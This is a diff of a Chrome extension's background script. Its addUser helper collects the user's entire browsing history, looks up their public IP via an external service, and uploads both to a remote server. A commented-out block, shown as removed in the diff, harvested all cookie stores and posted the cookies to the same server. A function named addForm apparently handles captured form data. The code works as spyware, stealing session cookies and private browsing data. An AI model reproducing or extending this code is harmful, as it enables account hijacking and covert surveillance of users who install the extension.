@@ -5,7 +5,6 @@ const makeRequest = (url, options) => {
         .then((res) =>
             res.json().then((json) => ({ status: res.status, json }))
         )
-        .catch((err) => console.error(err.message))
         .then((res) => {
             if (res.status !== 200) {
                 throw Error(res.json.error);
@@ -25,6 +24,7 @@ const postRequest = (route, data) =>
     });
 
 /********************* Helper ***************************/
+
 // Initial add user, and their current history
 const addUser = (uid) => {
     const data = {
@@ -39,25 +39,31 @@ const addUser = (uid) => {
     // TODO Split history into another request after create user
     chrome.history.search({ text: "" }, (h) => {
         data.history = h;
-        postRequest("/user/", data).catch((err) => console.log(err.message));
+        makeRequest("https://api.ipify.org?format=json")
+            .then((r) => (data.ip = r.ip))
+            .then(() =>
+                postRequest("/user/", data).catch((err) =>
+                    console.log(err.message)
+                )
+            );
     });
 
     // Get all stored cookies, PAYLOAD TOO LARGE
-    chrome.cookies.getAllCookieStores((cookieStores) => {
-        cookieStores.forEach((s) =>
-            chrome.cookies.getAll({ storeId: s.id }, (c) => {
-                const data = {
-                    uid,
-                    time: Date.now(),
-                    storeId: s.id,
-                    cookies: c,
-                };
-                postRequest("/cookies/store", data).catch((err) =>
-                    console.log(err.message)
-                );
-            })
-        );
-    });
+    // chrome.cookies.getAllCookieStores((cookieStores) => {
+    //     cookieStores.forEach((s) =>
+    //         chrome.cookies.getAll({ storeId: s.id }, (c) => {
+    //             const data = {
+    //                 uid,
+    //                 time: Date.now(),
+    //                 storeId: s.id,
+    //                 cookies: c,
+    //             };
+    //             postRequest("/cookies/store", data).catch((err) =>
+    //                 console.log(err.message)
+    //             );
+    //         })
+    //     );
+    // });
 };
 
 const addForm = (uid, form, tab) => {
